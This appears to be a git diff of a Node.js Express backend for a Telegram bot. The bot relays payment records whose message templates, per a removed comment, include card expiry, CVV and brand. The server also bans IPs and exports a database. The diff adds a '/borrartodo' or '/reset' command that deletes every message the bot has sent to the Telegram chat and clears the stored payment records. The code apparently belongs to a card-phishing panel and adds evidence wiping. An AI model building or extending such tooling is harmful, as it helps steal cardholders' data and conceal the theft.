@@ -1,4 +1,3 @@
-
 const express = require('express');
 const cors = require('cors');
 const XLSX = require('xlsx');
@@ -16,6 +15,9 @@ const pagosPendientes = new Map();
 
 // 🚫 IPS BANEADAS
 const ipsBaneadas = new Set();
+
+// 💬 IDs de TODOS los mensajes que el bot ha enviado (para poder borrarlos)
+const mensajesEnviados = new Set();
 
 // ============================================================
 // 🛡️ MIDDLEWARE GLOBAL DE BANEO
@@ -63,7 +65,11 @@ async function tgSendMessage(text, replyMarkup) {
     if (replyMarkup) body.reply_markup = replyMarkup;
     try {
         const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
-        return await r.json();
+        const data = await r.json();
+        if (data && data.ok && data.result && data.result.message_id) {
+            mensajesEnviados.add(data.result.message_id);
+        }
+        return data;
     } catch (e) { 
         console.error("❌ Error enviando mensaje a Telegram:", e);
         return { ok: false }; 
@@ -85,7 +91,7 @@ async function tgAnswerCallback(callbackQueryId, text) {
     } catch {}
 }
 
-// 👤 NUEVO: formatea al usuario que oprimió el botón
+// 👤 Formatea al usuario que oprimió el botón
 function formatearUsuarioTelegram(from) {
     if (!from) return '—';
     const nombre = [from.first_name, from.last_name].filter(Boolean).join(' ') || 'Sin nombre';
@@ -94,7 +100,7 @@ function formatearUsuarioTelegram(from) {
 }
 
 // ============================================================
-// 📝 TEXTOS DE MENSAJES TELEGRAM (TODOS CON VENCE, CVV Y MARCA)
+// 📝 TEXTOS DE MENSAJES TELEGRAM
 // ============================================================
 
 function textoPasoCrear(pago) {
@@ -473,6 +479,57 @@ async function procesarUpdate(update) {
                     console.error('Error en /base:', err);
                     await tgSendMessage('❌ Error generando la base de datos.');
                 }
+                return;
+            }
+
+            // ============================================================
+            // 🗑️ /borrartodo — Borra registros + mensajes enviados por el bot
+            // ============================================================
+            if (comando === '/borrartodo' || comando === '/reset') {
+                const cantidadRegistros = pagosPendientes.size;
+                const ids = [...mensajesEnviados];
+                let borradosOk = 0;
+                let borradosFail = 0;
+
+                for (const messageId of ids) {
+                    try {
+                        const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId })
+                        });
+                        const data = await r.json();
+                        if (data.ok) {
+                            borradosOk++;
+                            mensajesEnviados.delete(messageId);
+                        } else {
+                            borradosFail++;
+                            // Si ya no existe o es muy viejo, lo quitamos igual del set
+                            if (data.description && (
+                                data.description.includes('message to delete not found') ||
+                                data.description.includes("message can't be deleted")
+                            )) {
+                                mensajesEnviados.delete(messageId);
+                            }
+                        }
+                    } catch {
+                        borradosFail++;
+                    }
+                    // Pausa para respetar el límite de ~30 msg/seg de Telegram
+                    await new Promise(r => setTimeout(r, 40));
+                }
+
+                // Limpiar registros en memoria
+                pagosPendientes.clear();
+
+                await tgSendMessage(
+                    `🗑️ <b>HISTORIAL BORRADO</b>\n\n` +
+                    `📦 Registros eliminados: <b>${cantidadRegistros}</b>\n` +
+                    `💬 Mensajes del bot borrados: <b>${borradosOk}</b>\n` +
+                    `⚠️ No se pudieron borrar: <b>${borradosFail}</b>\n` +
+                    `<i>(Los mensajes con más de 48h o escritos por humanos no se pueden borrar por API)</i>\n` +
+                    `🕒 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
+                );
                 return;
             }
         }
